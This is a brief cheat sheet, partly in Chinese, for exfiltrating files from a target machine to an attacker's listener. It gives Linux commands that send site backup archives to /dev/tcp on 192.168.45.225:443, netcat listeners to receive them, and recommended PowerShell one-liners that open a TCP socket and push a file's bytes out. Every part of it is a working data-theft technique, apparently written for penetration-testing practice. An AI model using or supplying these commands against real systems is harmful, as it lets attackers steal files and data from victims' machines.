linux
cat sitebackup1.zip > /dev/tcp/192.168.45.225/443
cat sitebackup2.zip > /dev/tcp/192.168.45.225/443
cat sitebackup2.zip > /dev/tcp/192.168.45.225/443
nc -lvnp 443 > sitebackup1.zip
nc -lvnp 443 > sitebackup2.zip
nc -lvnp 443 > sitebackup3.zip


windows
Windows Powershell：最通用的发送文件方式（推荐）

攻击机监听：

nc -lvnp 443 > received.zip


Windows 上发送：

```
powershell -c "$c=New-Object System.Net.Sockets.TCPClient('192.168.45.225',443);
$s=$c.GetStream();$b=[IO.File]::ReadAllBytes('C:\path\sitebackup1.zip');
$s.Write($b,0,$b.Length);$s.Close()"

```

```
powershell -c "(New-Object Net.Sockets.TCPClient('192.168.45.225',443)).GetStream().Write((Get-Content C:\path\file.zip -Encoding byte),0,(Get-Content C:\path\file.zip -Encoding byte).Length)"

```